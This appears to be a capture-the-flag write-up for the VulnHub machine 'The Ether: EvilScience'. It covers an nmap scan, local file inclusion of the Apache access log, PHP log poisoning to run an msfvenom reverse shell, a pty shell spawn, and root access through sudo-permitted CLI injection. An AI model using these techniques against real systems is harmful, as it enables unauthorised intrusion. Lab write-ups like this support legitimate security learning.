

Recon part

host scan:

	nmap -sV -A -Pn 192.168.187.128 -p-

	Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-17 12:51 EST
	Nmap scan report for 192.168.187.128
	Host is up (0.0010s latency).
	Not shown: 65533 closed ports
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
	|_  256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: The Ether
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 8.46 seconds



go to web server and find LFI for access apache logs : http://192.168.187.128/?file=../log/access.log#top

As LFI works over a php engine it is a big change that php code injected inside log file will be processed by php:

so:
1. intercept any request to web server
2. inject php code inside


![alt text](https://github.com/s1l3xz/some/blob/master/vuln_hub/The_Ether_EvilScience/inject.jpg)


where "shell" file is generated reverse shell ( generated by msfvenom )




than refresh http://192.168.187.128/?file=../log/access.log#top in browser and php code executed


privilege escalation

spawn to tty shell : python -c 'import pty; pty.spawn("/bin/sh")'    ( see all options https://netsec.ws/?p=337)
see what files can be executed under root user from www-data : sudo -l

![alt text](https://github.com/s1l3xz/some/blob/master/vuln_hub/The_Ether_EvilScience/priv1.png)


got root command execution by CLI injection ( thank Julia team member , I really tried over ssh username injection :(   ) : 

![alt text](https://github.com/s1l3xz/some/blob/master/vuln_hub/The_Ether_EvilScience/priv2.png)


got flag in /root dir inside picture in base64 encoding:

![alt text](https://github.com/s1l3xz/some/blob/master/vuln_hub/The_Ether_EvilScience/flag1.png)


![alt text](https://github.com/s1l3xz/some/blob/master/vuln_hub/The_Ether_EvilScience/flag2.png)

